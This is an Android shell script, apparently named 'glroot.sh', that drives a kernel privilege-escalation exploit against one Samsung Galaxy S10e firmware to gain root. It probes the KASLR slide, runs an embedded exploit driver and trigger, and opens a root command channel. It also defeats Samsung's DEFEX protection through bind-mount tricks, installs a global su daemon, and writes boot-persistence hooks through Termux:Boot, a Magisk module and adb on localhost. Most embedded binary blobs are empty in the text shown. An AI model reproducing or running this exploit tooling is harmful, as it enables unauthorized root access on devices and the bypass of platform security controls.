#!/system/bin/sh
# =============================================================================
#  glroot.sh  --  ONE-FILE per-boot root for
#                 Samsung SM-G970U/SM-G970U1 (beyond0q) kernel 4.14.190 (G970U*U9IXJ1)
#
#  Everything is inside this single file (exploit driver, root daemon, slide
#  probe and trigger). Nothing else to push.
#
#  >>> RUN IT AS THE "shell" USER (uid 2000): inside rish / adb shell.  <<<
#      Termux:  rish        (then type one of the commands below)
#
#    sh /data/local/tmp/glroot.sh             arm root
#    sh /data/local/tmp/glroot.sh --sh        interactive ROOT shell
#    sh /data/local/tmp/glroot.sh <cmd...>    run ONE command as root
#    sh /data/local/tmp/glroot.sh --root-only arm root
#    sh /data/local/tmp/glroot.sh --sud       start the sud root daemon (global su)
#    sh /data/local/tmp/glroot.sh --status    show state
#    sh /data/local/tmp/glroot.sh --boot      non-interactive bring-up (boot hooks)
#    sh /data/local/tmp/glroot.sh --persist   install the boot hook(s) that exist
#
#  Root is TRANSIENT (this boot only).  --boot is the hook-friendly entry point;
#  --persist installs the hooks that are actually possible on a locked device
#  (host adb watcher and, if a manager/Termux:Boot is already present, that hook).
#  See the GhostLock-Runbook.md section "Reboot survival".
# =============================================================================
set -u

SELF="$0"
case "$SELF" in */*) ;; *) SELF="$(pwd)/$SELF" ;; esac

DIR=/data/local/tmp/.gl
BIN="$DIR/glU1"
MPNL="$DIR/mpnl"
SP="$DIR/slideprobe"
PWN="$DIR/pwn2"

# DEFEX bind-mount exec helper
RUNROOT="$DIR/runroot.sh"
SUD="$DIR/sud"             # sud daemon+client (patched AF_UNIX) -> global su
# Policy-enforcing client installed by gl_fix.sh.  Same size as `sud`, different
# build (it reads policy.bin and refuses unlisted uids); prefer it for the su on
# PATH, but only when a policy actually exists -- otherwise it is fail-closed
# and even `su -c id` is denied.  Standalone `sud` is the daemon and recovery
# client.
SU_CLIENT="$DIR/sud_policy"
{ [ -s /odm/ghostlock/policy.bin ] || [ -s "$DIR/manager/policy.bin" ]; } \
  || SU_CLIENT="$SUD"
[ -s "$SU_CLIENT" ] || SU_CLIENT="$SUD"

RC=/data/local/tmp/rcmd
RO=/data/local/tmp/rout
RAN=/data/local/tmp/mp_ran

say() { printf '%s\n' "$*"; }

# ---- must be the "shell" user (or root) ------------------------------------
MYUID="$(id -u 2>/dev/null || echo 9)"
if [ "$MYUID" != "2000" ] && [ "$MYUID" != "0" ]; then
  say "This must run as the 'shell' user (uid 2000)."
  say "In Termux:   rish"
  say "then:        sh $SELF"
  exit 1
fi

# ---- base64 ----------------------------------------------------------------
if /system/bin/toybox base64 -d </dev/null >/dev/null 2>&1; then
  B64="/system/bin/toybox base64 -d"
else
  B64="base64 -d"
fi

mkdir -p "$DIR" 2>/dev/null

# ---- single instance --------------------------------------------------------
# Two competing runs (e.g. Termux:Boot and a host watcher) stomp on the same
# rcmd/rout files and can wedge the phone.  mkdir is atomic on /data.
LOCK="$DIR/.lock"
release_lock() { rm -rf "$LOCK" 2>/dev/null; }
acquire_lock() {
  n=0
  while ! mkdir "$LOCK" 2>/dev/null; do
    lp=""
    [ -f "$LOCK/pid" ] && lp="$(cat "$LOCK/pid" 2>/dev/null)"
    case "$lp" in ''|*[!0-9]*) lp=0 ;; esac
    if [ "$lp" -gt 0 ] && [ ! -d "/proc/$lp" ]; then
      rm -rf "$LOCK" 2>/dev/null
      continue
    fi
    n=$((n+1))
    if [ "$n" -ge 60 ]; then
      say "[-] another glroot.sh run is active (lock $LOCK)"
      return 1
    fi
    sleep 1
  done
  echo "$$" > "$LOCK/pid" 2>/dev/null
  return 0
}
trap 'release_lock' EXIT
trap 'release_lock; exit 130' INT TERM
acquire_lock || exit 1

blob() { # $1 name  $2 out
  awk -v s="__GLBLOB:$1__" -v d="__GLBLOB:$1:END__" \
      '$0==s{f=1;next} $0==d{f=0} f' "$SELF" | $B64 > "$2"
  chmod 755 "$2" 2>/dev/null
}

size_is() { [ -f "$1" ] && [ "$(wc -c < "$1" 2>/dev/null | tr -d ' ')" = "$2" ]; }

SZ_BIN=950472
SZ_MPNL=760720
SZ_SP=646216
SZ_PWN=4
SUD_SIZE=794856

if ! size_is "$BIN" $SZ_BIN || ! size_is "$MPNL" $SZ_MPNL \
   || ! size_is "$SP" $SZ_SP || ! size_is "$PWN" $SZ_PWN; then
  say "[*] extracting embedded binaries -> $DIR"
  blob driver "$BIN"
  blob mpnl "$MPNL"
  blob slideprobe "$SP"
  blob pwn2 "$PWN"
  chmod 755 "$BIN" "$MPNL" "$SP" "$PWN" 2>/dev/null
fi

if ! size_is "$BIN" $SZ_BIN || ! size_is "$MPNL" $SZ_MPNL \
   || ! size_is "$SP" $SZ_SP || ! size_is "$PWN" $SZ_PWN; then
  say "[-] extraction failed (truncated file?)"
  exit 1
fi

# ---- root command channel (mpnl polls rcmd -> writes rout) ------------------
rootq() { # run $1 as root, print output
  : > "$RO" 2>/dev/null
  printf '%s\n' "$1" > "$RC" 2>/dev/null
  i=0
  while [ $i -lt 80 ]; do
    if [ -s "$RO" ]; then sleep 0.2; cat "$RO" 2>/dev/null; return 0; fi
    sleep 0.25
    i=$((i+1))
  done
  return 1
}

armed() { rootq 'echo __GL_OK__' 2>/dev/null | grep -q __GL_OK__; }

# The managed flow (gl_fix.sh) publishes its own health line and installs
# /odm/bin/su; it does NOT use the mpnl channel.  Check those first, otherwise
# --boot/--status would wait 20s on a channel that was never loaded.
stat_live() { [ -s /odm/ghostlock/status ] && grep -q 'suok=1' /odm/ghostlock/status 2>/dev/null; }
su_live()   { [ -x /odm/bin/su ] && /odm/bin/su -c 'test "$(id -u)" = 0' >/dev/null 2>&1; }
root_live() {
  stat_live && return 0
  su_live   && return 0
  # only probe the file channel when the driver was pointed at mpnl
  case "${MP_PATH:-$MPNL}" in "$MPNL") armed && return 0 ;; esac
  return 1
}
wait_live() { # $1 = seconds
  n=0
  chan_n=0
  lim=$(( $1 * 2 ))
  while [ "$n" -lt "$lim" ]; do
    stat_live && return 0
    su_live   && return 0
    # fallback mode: the mpnl agent may be the only channel.  Probe it
    # sparingly -- a dead channel costs rootq's full 20s timeout.
    if [ "${CHAN_MODE:-0}" = "1" ]; then
      chan_n=$((chan_n+1))
      if [ "$chan_n" -ge 5 ]; then
        chan_n=0
        armed && return 0
      fi
    fi
    sleep 0.5
    n=$((n+1))
  done
  return 1
}

QUIET=0
CHAN_MODE=0
arm_core() {
  say "[*] probing KASLR slide (takes ~40-80s) ..."
  timeout 90 "$SP" > "$DIR/sp.log" 2>&1
  IP="$(grep -a -m1 bd4 "$DIR/sp.log" 2>/dev/null | awk '{print $2}')"
  LOW="$(printf '%s' "$IP" | sed -n 's/.*\([0-9a-fA-F]\{8\}\)$/\1/p')"
  if [ "${#LOW}" -ne 8 ]; then
    say "[-] slide probe: no usable address (raw='$IP')"
    return 1
  fi
  SL=$((0x$LOW - 0x08000000 - 0x3bd4))
  if [ "$SL" -lt 0 ] || [ "$SL" -gt 1073741824 ]; then
    say "[-] slide probe: implausible slide (raw='$IP' low=0x$LOW)"
    return 1
  fi
  SLIDE="$(printf '0x%x' "$SL")"
  say "[*] slide=$SLIDE"

  say "[*] warming /data/local/tmp channel files"
  cat "$MPNL" >/dev/null 2>&1
  : > "$RC"; : > "$RO"; : > "$RAN"
  cat "$RC"  >/dev/null 2>&1
  cat "$RO"  >/dev/null 2>&1
  cat "$RAN" >/dev/null 2>&1
  cat "$PWN" >/dev/null 2>&1

  say "[*] running exploit (the risky step - a wedge reboots the phone) ..."
  ( cd "$DIR" && env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 \
      PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 \
      SLIDE="$SLIDE" MP_PATH="${MP_PATH:-$MPNL}" \
      timeout 150 "$BIN" --stop-after=verify --log=info )

  say "[*] firing trigger ..."
  "$PWN" >/dev/null 2>&1
  return 0
}

arm() {
  if root_live; then [ "$QUIET" = 1 ] || say "[+] root is already live."; return 0; fi
  arm_core || return 1
  sleep 2

  if root_live; then
    say ""
    say "============================================="
    say "   ROOT IS LIVE   (transient - this boot only)"
    say "============================================="
    if su_live; then
      /odm/bin/su -c 'id; getenforce; uname -r'
    else
      rootq 'id; getenforce; uname -r'
    fi
    say ""
    say "  root shell :  sh $SELF --sh"
    say "  one command:  sh $SELF <cmd>"
    say "  web UI:       http://127.0.0.1:8080/  (in the phone browser)"
    return 0
  fi
  say "[-] root did not come up. Re-run (the PI walk is probabilistic)."
  return 1
}

# Non-interactive variant: the managed helper announces itself through
# /odm/ghostlock/status + /odm/bin/su, not through mpnl.
arm_boot() {
  if root_live; then [ "$QUIET" = 1 ] || say "[+] root is already live."; return 0; fi
  arm_core || return 1
  say "[*] waiting for the managed su ..."
  if wait_live 90; then
    cat /odm/ghostlock/status 2>/dev/null
    say "[+] boot: root is live"
    return 0
  fi
  say "[-] boot: root did NOT come up (see /odm/ghostlock/helper.log)"
  return 1
}

# ---- DEFEX bind-mount exec helper (runroot.sh) ------------------------------
#  toybox 0.8.4 'mount' has no --make-private, so a private mount ns cannot be
#  made and the bind would leak into init.  Instead: bind, exec, lazy-unmount.
write_runroot() {
  cat > "$RUNROOT" <<'RR'
#!/system/bin/sh
# runroot.sh -- run a /data ELF as root, defeating Samsung DEFEX.
BIN="$1"; shift
case "$BIN" in /*) ;; *) BIN="/data/local/tmp/$BIN" ;; esac
SAFE=""
for s in /system/bin/fsdbg /system/bin/smdexe /system/bin/ddexe /system/bin/resetreason /system/bin/atrace; do
  [ -e "$s" ] && SAFE="$s" && break
done
[ -n "$SAFE" ] || { echo "runroot: no safeplace target" >&2; exit 3; }
mount --bind "$BIN" "$SAFE" || { echo "runroot: bind failed" >&2; exit 4; }
"$SAFE" "$@"
rc=$?
umount -l "$SAFE" 2>/dev/null
exit $rc
RR
  chmod 755 "$RUNROOT" 2>/dev/null
}

# ---------------------------------------------------------------------------
#  sud: global su daemon (pascua28/sud, patched to an abstract AF_UNIX socket)
# ---------------------------------------------------------------------------
ensure_sud() {
  size_is "$SUD" $SUD_SIZE || blob sud "$SUD"
  chmod 755 "$SUD" 2>/dev/null
  size_is "$SUD" $SUD_SIZE || { say "[-] could not extract sud"; return 1; }
  return 0
}

install_su_path() {
  # Bind the sud client over an existing 'su' name so `su` resolves on PATH.
  for p in /system/bin/su /system/xbin/su /vendor/bin/su /product/bin/su /sbin/su; do
    [ -e "$p" ] || continue
    cat "$p" >/dev/null 2>&1
    if rootq "mount --bind ${SU_CLIENT:-$SUD} $p && echo __GL_BOUND__" 2>/dev/null | grep -q __GL_BOUND__; then
      say "[+] su on PATH: $p  (-> sud)"
      return 0
    fi
  done
  say "[-] no pre-existing 'su' path to bind; use /data/local/tmp/su"
  return 1
}

ODM=/odm
SU_ON_PATH="$ODM/bin/su"

odm_mounted() { grep -q ' /odm tmpfs ' /proc/mounts 2>/dev/null; }
warm() { [ -f "$1" ] && cat "$1" >/dev/null 2>&1; }

start_sud() {
  [ "$MYUID" = "2000" ] || { say "[-] sud needs the 'shell' user (run in rish/adb)."; return 1; }
  arm || return 1
  ensure_sud || return 1
  write_runroot

  # SU_CLIENT (policy client, else standalone sud) is resolved at the top.

  # The kernel-context root has NO fscrypt keys: it can only read /data inodes
  # that are already in the page/inode cache.  The shell user DOES have the
  # keys, so touch every file the root stage will need *before* it runs.
  say "[*] warming /data inodes for the kernel-domain root"
  : > "$DIR/sud.log" 2>/dev/null
  warm "$SUD"
  warm "$SU_CLIENT"
  warm "$RUNROOT"
  warm "$DIR/sud.log"

  # --- /odm is already on the default PATH; put a real su there -------------
  if odm_mounted; then
    say "[*] /odm tmpfs already mounted"
  else
    if rootq 'mount -t tmpfs -o rw,exec,nosuid,nodev,mode=755,size=32m tmpfs /odm >/dev/null 2>&1; echo __ODM__' 2>/dev/null | grep -q __ODM__; then
      say "[+] /odm tmpfs mounted"
    else
      say "[-] could not mount /odm tmpfs"
    fi
  fi

  if odm_mounted; then
    say "[*] installing global su -> $SU_ON_PATH"
    if rootq "mkdir -p $ODM/bin; cp $SU_CLIENT $ODM/bin/su.new; mv $ODM/bin/su.new $ODM/bin/su; cp $SUD $ODM/bin/sud.new; mv $ODM/bin/sud.new $ODM/bin/sud; cp $RUNROOT $ODM/bin/runroot.sh; chmod 755 $ODM/bin/su $ODM/bin/sud $ODM/bin/runroot.sh; chmod 755 $ODM $ODM/bin; [ -e $ODM/etc ] || ln -s /vendor/odm/etc $ODM/etc; echo __ODMOK__" 2>/dev/null | grep -q __ODMOK__; then
      say "[+] /odm/bin/su installed"
    else
      say "[-] /odm install failed"
    fi
  fi

  # --- start the daemon through a DEFEX safeplace --------------------------
  if [ -x "$SU_ON_PATH" ] && "$SU_ON_PATH" -c 'echo __SUOK__' 2>/dev/null | grep -q __SUOK__; then
    say "[+] sud daemon already serving root"
  else
    say "[*] starting the sud daemon as ROOT ..."
    if [ -x "$ODM/bin/runroot.sh" ]; then
      rootq "sh $ODM/bin/runroot.sh $ODM/bin/sud --daemon >> $ODM/sud.log 2>&1" 2>/dev/null
    else
      rootq "sh $RUNROOT $SUD --daemon >> $DIR/sud.log 2>&1" 2>/dev/null
    fi
    sleep 1
  fi

  # --- legacy fallback: bind over an existing 'su' name --------------------
  if [ -x "$SU_ON_PATH" ]; then
    install_su_path || true
  fi

  # --- verify --------------------------------------------------------------
  if [ -x "$SU_ON_PATH" ] && "$SU_ON_PATH" -c 'id' 2>/dev/null | grep -q 'uid=0(root)'; then
    say ""
    say "============================================="
    say "   GLOBAL su READY:  $SU_ON_PATH"
    say "   test:  su -c id"
    say "============================================="
    log=""
    [ -f "$ODM/sud.log" ] && log="   daemon log: $ODM/sud.log"
    [ -n "$log" ] && say "$log"
    return 0
  fi
  say "[-] su did not answer (see $ODM/sud.log or $DIR/sud.log)"
  return 1
}

# ---------------------------------------------------------------------------
#  Run any /data binary as root using DEFEX bypass (runroot.sh)
#  Usage: run_as_root /data/local/tmp/your_binary [args...]
# -----------------------------------------------------------------------------
run_as_root() {
  [ "$MYUID" = "2000" ] || { say "[-] Must run as shell user"; return 1; }
  arm || return 1
  write_runroot
  sh "$RUNROOT" "$@"
}

case "${1:-}" in
  --status)
    if stat_live || su_live; then
      say "[+] root live (managed su):"
      /odm/bin/su -c 'id; getenforce; uname -r' 2>/dev/null
      sed 's/^/    status: /' /odm/ghostlock/status 2>/dev/null
    elif armed; then
      say "[+] root live (file channel):"
      rootq 'id; getenforce; uname -r'
    else
      say "root: not armed"
    fi
    if [ -x /odm/bin/su ] && /odm/bin/su -c true 2>/dev/null; then
      say "    global su: /odm/bin/su"
    fi
    ps -A -o USER,NAME 2>/dev/null | grep '^root .*fsdbg$' | sed 's/^/    sud:     /'
    for p in /system/bin/su /system/xbin/su /vendor/bin/su /product/bin/su; do
      [ -e "$p" ] && grep -q " $p " /proc/self/mountinfo 2>/dev/null && say "    su PATH: $p (bound)"
    done
    ;;
  --sh)
    QUIET=1
    arm || exit 1
    say "[*] root shell (file channel). 'exit' or Ctrl-D to quit."
    while IFS= read -r line; do
      case "$line" in exit|quit) break;; esac
      [ -z "$line" ] && continue
      rootq "$line"
    done
    ;;
  --root-only)
    arm
    ;;
  --boot)
    # Non-interactive bring-up for boot hooks (host watcher / manager module).
    # Points modprobe_path at gl_fix.sh (managed helper: installs the policy su,
    # syncs policy, starts/heals the daemon) and waits for its health line.
    QUIET=1
    MP_PATH="$DIR/gl_fix.sh"
    if [ ! -f "$MP_PATH" ]; then
      say "[!] $MP_PATH missing - falling back to the mpnl file channel"
      MP_PATH="$MPNL"
      CHAN_MODE=1
    else
      CHAN_MODE=0
      chmod 755 "$MP_PATH" 2>/dev/null
    fi
    say "[*] warming /data inodes (root has no fscrypt keys)"
    for f in "$MP_PATH" "$DIR/asuid" "$DIR/sud_policy" "$DIR/sud" "$DIR/keylink" \
             "$DIR/runroot.sh" "$DIR/busybox" "$DIR/rw.list" "$DIR/manager/req" \
             "$DIR/manager/glm" "$DIR/manager/policy.bin" \
             "$DIR/manager/policy.conf"; do
      warm "$f"
    done
    if [ -d "$DIR/rwstore" ]; then
      find "$DIR/rwstore" -type f -exec cat {} + >/dev/null 2>&1
    fi
    arm_boot
    exit $?
    ;;
  --persist)
    # Install every boot hook this device can actually honour, and say plainly
    # which ones cannot exist.  glroot needs uid 2000, so a hook has to be able
    # to become the shell user; a manager's root can do that with setuidgid.
    HOOK="$DIR/boot.sh"
    cat > "$HOOK" <<'EOF'
#!/system/bin/sh
# generated by: glroot.sh --persist
exec sh /data/local/tmp/glroot.sh --boot
EOF
    chmod 755 "$HOOK" 2>/dev/null
    say "[+] boot wrapper: $HOOK"

    # --- Termux:Boot payload (glm copies it into ~/.termux/boot) ------------
    cat > "$DIR/00-root.sh" <<'RB'
#!/data/data/com.termux/files/usr/bin/sh
# Termux:Boot hook generated by GhostLock (glroot.sh --persist).
# Termux holds the CE fscrypt key, so only the Termux app can install this.
# The exploit itself still has to run as uid 2000; reach it over the phone's
# own adbd on 127.0.0.1:5555 and use --boot (no mpnl channel needed).
export PATH="${PREFIX:-/data/data/com.termux/files/usr}/bin:$PATH"
ADB="${PREFIX:-/data/data/com.termux/files/usr}/bin/adb"
PORT="${ANDROID_ADB_SERVER_PORT:-5038}"
export ANDROID_ADB_SERVER_PORT="$PORT"
LOG="${HOME:-/data/data/com.termux/files/home}/glroot-boot.log"

say() { echo "$(date) $*" >> "$LOG"; }
say "boot hook start"

i=0
while [ "$(getprop sys.boot_completed 2>/dev/null)" != "1" ] && [ "$i" -lt 300 ]; do
  sleep 2
  i=$((i+1))
done

[ -x "$ADB" ] || { say "adb missing - pkg install android-tools"; exit 1; }

i=0
while [ "$i" -lt 60 ]; do
  "$ADB" connect 127.0.0.1:5555 >> "$LOG" 2>&1
  if "$ADB" -s 127.0.0.1:5555 shell true >/dev/null 2>&1; then
    say "adb connected"
    break
  fi
  sleep 10
  i=$((i+1))
done

"$ADB" -s 127.0.0.1:5555 shell sh /data/local/tmp/glroot.sh --boot >> "$LOG" 2>&1
rc=$?
say "glroot --boot rc=$rc"
exit $rc
RB
    chmod 644 "$DIR/00-root.sh" 2>/dev/null
    say "[+] Termux:Boot payload: $DIR/00-root.sh"

    # --- manager module (Magisk / KernelSU / APatch) ------------------------
    if mkdir -p /data/adb/modules/glroot 2>/dev/null; then
      MD=/data/adb/modules/glroot
      printf 'id=glroot\nname=GhostLock auto-arm\nversion=v1.0\nversionCode=1\nauthor=ghostlock\ndescription=Re-arms GhostLock (--boot) after every boot.\n' > "$MD/module.prop" 2>/dev/null
      cat > "$MD/service.sh" <<'MS'
#!/system/bin/sh
# Runs as the manager's root, later than post-fs-data.  glroot requires uid
# 2000 (vendor_qti_init_shell), so drop privileges before running it.
MODDIR=${0%/*}
BB=$MODDIR/bin/busybox
[ -x "$BB" ] || BB=busybox
i=0
while [ "$(getprop sys.boot_completed)" != "1" ] && [ "$i" -lt 120 ]; do sleep 1; i=$((i+1)); done
if [ -x /odm/bin/su ] && /odm/bin/su -c 'test "$(id -u)" = 0' 2>/dev/null; then exit 0; fi
$BB setuidgid 2000 sh /data/local/tmp/glroot.sh --boot >> "$MODDIR/arm.log" 2>&1
MS
      chmod 755 "$MD" "$MD/service.sh" 2>/dev/null
      mkdir -p "$MD/bin" 2>/dev/null
      [ -f "$MD/bin/busybox" ] || cp "$DIR/busybox" "$MD/bin/busybox" 2>/dev/null
      chmod 755 "$MD/bin/busybox" 2>/dev/null
      say "[+] manager hook: $MD/service.sh"
    else
      say "[i] no boot manager (cannot write /data/adb) - use the module zip or host watcher"
    fi

    # --- Termux:Boot --------------------------------------------------------
    # Only the Termux app holds the CE key for ~/.termux/boot (runbook sec. 7),
    # so this script cannot install it.  glm does the copy when run in Termux.
    say "[i] Termux:Boot: run 'glm boot' (or any glm command) inside Termux once"
    say "    to install ~/.termux/boot/00-root.sh from $DIR/00-root.sh"

    say "[i] host-side auto-arm: run GhostLock-Watch.ps1 (or .cmd) on the PC"
    say "[i] otherwise re-run after each boot: sh /data/local/tmp/glroot.sh --boot"
    ;;
  --sud)
    start_sud
    ;;
  --run-as-root)
    shift
    run_as_root "$@"
    ;;
  ""|--arm)
    arm
    ;;
  *)
    arm || exit 1
    rootq "$*"
    ;;
esac

# Everything below this line is embedded payload (base64 blobs, read via awk).
exit 0
__GLBLOB:driver__

__GLBLOB:driver:END__
__GLBLOB:mpnl__

__GLBLOB:mpnl:END__
__GLBLOB:slideprobe__

__GLBLOB:slideprobe:END__
__GLBLOB:pwn2__
/////w==
__GLBLOB:pwn2:END__
__GLBLOB:sud__

__GLBLOB:sud:END__
